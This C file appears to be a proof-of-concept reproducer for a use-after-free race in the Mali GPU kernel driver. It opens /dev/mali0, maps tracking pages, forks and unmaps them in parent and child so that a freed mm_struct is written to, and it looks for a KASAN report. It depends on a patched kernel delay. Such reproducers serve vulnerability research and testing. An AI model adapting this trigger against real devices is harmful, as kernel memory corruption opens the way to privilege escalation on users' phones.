// SPDX-License-Identifier: MIT
/*
 * Simple demonstration of Mali driver vulnerability testing approach
 * This is a simplified version that shows the testing methodology
 * without complex macro issues.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/wait.h>
#include <time.h>
#include <signal.h>

#include "../tools/mali_handshake.h"

// Simple error checking function

// Define IOCTL constants
#define KBASE_IOCTL_TYPE 0x80

struct kbase_ioctl_version_check {
    unsigned short major;
    unsigned short minor;
};
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)

struct kbase_ioctl_set_flags {
    unsigned int create_flags;
};
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)

#define LOCAL_PAGE_SHIFT 12
#define BASE_MEM_MAP_TRACKING_HANDLE (3ul << LOCAL_PAGE_SHIFT)

// Simple error checking macro
#define SYSCHK(x) ((__typeof__(x))simple_syschk((long)(x), #x, __FILE__, __LINE__))

long simple_syschk(long result, const char* call, const char* file, int line) {
    if (result == -1) {
        fprintf(stderr, "\n[FATAL] System call failed: %s\n", strerror(errno));
        fprintf(stderr, "       File: %s, Line: %d\n", file, line);
        fprintf(stderr, "       Call: %s\n", call);
        exit(1);
    }
    return result;
}

int main(void) {
    printf("=== Mali Kbase mm_struct UAF Test Demo ===\n");
    printf("PID: %d, PPID: %d\n", getpid(), getppid());
    printf("\n");
    
    // Step 1: Device initialization
    printf("[STEP 1] Device Initialization\n");
    printf("  - Opening /dev/mali0 device file\n");
    
    int mali_fd = SYSCHK(open("/dev/mali0", O_RDWR));
    printf("  -> SUCCESS: Device file descriptor: %d\n", mali_fd);
    
    struct stat fd_stat;
    if (fstat(mali_fd, &fd_stat) == 0) {
        printf("  -> Device type: %s\n", (S_ISCHR(fd_stat.st_mode) ? "character device" : "other"));
        printf("  -> Device number: %d:%d\n", major(fd_stat.st_rdev), minor(fd_stat.st_rdev));
    }
    
    // Step 2: Version check ioctl
    printf("\n[STEP 2] Version Check Ioctl\n");
    printf("  - Command: KBASE_IOCTL_VERSION_CHECK (_IOWR(0x80, 0, ...))\n");
    
    struct kbase_ioctl_version_check vc = {.major = 11, .minor = 11};
    printf("  - Input: major=%d, minor=%d\n", vc.major, vc.minor);
    
    int version_ret = mali_kbase_version_check(mali_fd, &vc.major, &vc.minor);
    if (version_ret < 0) {
        printf("  -> FAILURE: %s\n", strerror(errno));
    } else {
        printf("  -> SUCCESS: Ioctl returned %d\n", version_ret);
    }
    
    // Step 3: Set flags ioctl
    printf("\n[STEP 3] Set Flags Ioctl\n");
    printf("  - Command: KBASE_IOCTL_SET_FLAGS (_IOW(0x80, 1, ...))\n");
    
    struct kbase_ioctl_set_flags set_flags = {.create_flags = 0};
    printf("  - Input: create_flags=%d\n", set_flags.create_flags);
    
    int flags_ret = ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags);
    if (flags_ret < 0) {
        printf("  -> FAILURE: %s\n", strerror(errno));
    } else {
        printf("  -> SUCCESS: Ioctl returned %d\n", flags_ret);
    }
    
    // Step 4: Create tracking page
    printf("\n[STEP 4] Tracking Page Mapping\n");
    printf("  - Command: mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED, mali_fd, BASE_MEM_MAP_TRACKING_HANDLE)\n");
    
    void *parent_tracking_page = SYSCHK(mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED,
                                             mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
    printf("  -> SUCCESS: Page mapped at address: %p\n", parent_tracking_page);
    
    // Step 5: Fork for race condition
    printf("\n[STEP 5] Process Fork\n");
    printf("  - Purpose: Create child process for race condition test\n");
    
    if (signal(SIGCHLD, SIG_IGN) == SIG_ERR) {
        printf("  -> WARNING: SIGCHLD handler setup failed\n");
    }
    
    pid_t child_pid = SYSCHK(fork());
    printf("  -> SUCCESS: Child PID: %d\n", child_pid);
    
    if (child_pid == 0) {
        // Child process
        printf("\n[STEP 5a] Child Process\n");
        printf("  - Setting name to 'CHILD' via prctl\n");
        prctl(PR_SET_NAME, "CHILD", 0, 0, 0);
        
        printf("  - Creating child tracking page\n");
        void *child_tracking_page = SYSCHK(mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED,
                                               mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
        printf("  -> Child page address: %p\n", child_tracking_page);
        
        printf("  - Sleeping 2 seconds for race control\n");
        sleep(2);
        
        printf("  - Unmapping child page (triggers UAF setup)\n");
        SYSCHK(munmap(child_tracking_page, 0x1000));
        printf("  -> Child page unmapped, mm_struct will be freed\n");
        
        printf("  - Exiting child process (mm_struct freed)\n");
        exit(0);
    } else {
        // Parent process
        printf("\n[STEP 6a] Parent Process\n");
        printf("  - Sleeping 1 second for race window setup\n");
        
        sleep(1);
        
        printf("  - Setting name to 'SLOWME' (enables kernel patch delay)\n");
        prctl(PR_SET_NAME, "SLOWME", 0, 0, 0);
        
        printf("  - Unmapping parent page (triggers drain UAF)\n");
        void *parent_page = parent_tracking_page;
        SYSCHK(munmap(parent_page, 0x1000));
        printf("  -> Parent page unmapped, triggers kbasep_os_process_page_usage_drain()\n");
        
        printf("  - Setting name back to 'PARENT'\n");
        prctl(PR_SET_NAME, "PARENT", 0, 0, 0);
        
        printf("\n[STEP 7] Race Condition Analysis\n");
        printf("  - Child mm_struct has been freed by kernel\n");
        printf("  - Parent's drain will attempt to write to freed memory\n");
        printf("  - Look for KASAN: use-after-free BUG in kernel logs\n");
        printf("  - Expected: BUG in kbasep_add_mm_counter() at offset 0x%x\n", 696);
        printf("\n");
        
        // Wait for child
        waitpid(child_pid, NULL, 0);
        printf("  -> Child process completed\n");
        
        return 0;
    }
}